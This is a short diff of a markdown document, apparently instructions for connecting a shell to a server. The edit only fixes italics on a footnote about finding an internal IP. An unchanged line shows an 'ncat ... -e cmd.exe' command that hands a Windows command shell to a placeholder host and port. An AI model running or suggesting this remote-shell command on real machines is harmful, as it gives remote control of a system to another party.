@@ -16,4 +16,4 @@ For Linux/Bash:
 For Windows:
 `ncat <server-internal-ip> <port> -e cmd.exe`
 
-*To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.
+*To find the internal IP run `hostname I` on Linux OR `ipconfig` on Windows.*
